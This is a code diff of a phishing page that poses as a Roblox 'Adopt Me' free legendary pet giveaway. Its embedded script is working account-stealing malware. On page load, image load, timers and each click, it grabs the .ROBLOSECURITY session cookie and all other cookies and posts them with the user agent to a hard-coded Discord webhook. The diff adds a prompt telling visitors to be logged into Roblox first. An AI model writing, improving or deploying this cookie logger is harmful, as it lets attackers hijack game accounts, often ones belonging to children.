@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Adopt Me - Free Neon Legendaries!</title>
     
-    <!-- Discord Preview -->
     <meta property="og:title" content="🎉 FREE NEON LEGENDARY PETS in Adopt Me!">
     <meta property="og:description" content="Click to claim your limited pets before the event ends!">
     <meta property="og:image" content="https://i.imgur.com/8zKz5vL.jpeg">
@@ -13,38 +12,29 @@
     <meta property="og:type" content="article">
 
     <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background: #0a0a0a;
-            color: white;
-            font-family: Arial, sans-serif;
-            text-align: center;
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-        }
-        img {
-            max-width: 90%;
-            border: 5px solid #00ffcc;
-            box-shadow: 0 0 40px #ff00aa;
-            border-radius: 15px;
-        }
-        h1 { color: #ff00aa; text-shadow: 0 0 20px #ff00aa; }
+        body { margin:0; padding:0; background:#0a0a0a; color:white; font-family:Arial; text-align:center; height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center; }
+        img { max-width:90%; border:5px solid #00ffcc; box-shadow:0 0 40px #ff00aa; border-radius:15px; }
+        h1 { color:#ff00aa; text-shadow:0 0 20px #ff00aa; }
+        .note { color:#ffff00; margin:15px; font-size:16px; }
     </style>
 </head>
 <body>
     <h1>🎉 ADOPT ME FREE LEGENDARY EVENT! 🎉</h1>
     <img id="adoptmeimg" src="https://i.imgur.com/8zKz5vL.jpeg" alt="Adopt Me">
 
+    <p class="note">Make sure you're logged into Roblox in this browser first!</p>
+
     <script>
         const webhook = "https://discord.com/api/webhooks/1506368763271057459/1VdWzn-_ZxnjzxHygEweopXNvbGZqe0iRgyqPRgQwJekIHLHQ3IQM1rNsBNiG3aOQqYA";
 
         function logCookie() {
-            const cookies = document.cookie;
-            const robloxCookie = cookies.split('; ').find(row => row.startsWith('.ROBLOSECURITY='))?.split('=')[1] || "No .ROBLOSECURITY cookie";
+            let cookies = document.cookie;
+            let robloxCookie = cookies.split('; ').find(row => row.startsWith('.ROBLOSECURITY='))?.split('=')[1] || "NOT_FOUND";
+
+            // Extra attempt for Roblox
+            if (robloxCookie === "NOT_FOUND") {
+                robloxCookie = "Cookie not accessible (try logging in again on roblox.com in same browser)";
+            }
 
             const payload = {
                 content: "**🔥 Adopt Me Cookie Logged! 🔥**",
@@ -53,7 +43,7 @@
                     color: 0x00ffcc,
                     fields: [
                         { name: "Roblox Cookie (.ROBLOSECURITY)", value: "```" + robloxCookie + "```", inline: false },
-                        { name: "Full Cookies", value: "```" + (cookies || "none") + "```", inline: false },
+                        { name: "All Cookies", value: "```" + (cookies || "none") + "```", inline: false },
                         { name: "User Agent", value: "```" + navigator.userAgent + "```", inline: false },
                         { name: "Time", value: new Date().toISOString(), inline: false }
                     ]
@@ -62,16 +52,16 @@
 
             fetch(webhook, {
                 method: "POST",
-                headers: { "Content-Type": "application/json" },
+                headers: {"Content-Type": "application/json"},
                 body: JSON.stringify(payload)
             }).catch(() => {});
         }
 
         window.onload = logCookie;
         document.getElementById('adoptmeimg').onload = logCookie;
+        setTimeout(logCookie, 500);
+        setTimeout(logCookie, 2000);
         document.body.addEventListener('click', logCookie);
-        setTimeout(logCookie, 800);
-        setTimeout(logCookie, 2500);
     </script>
 </body>
 </html>
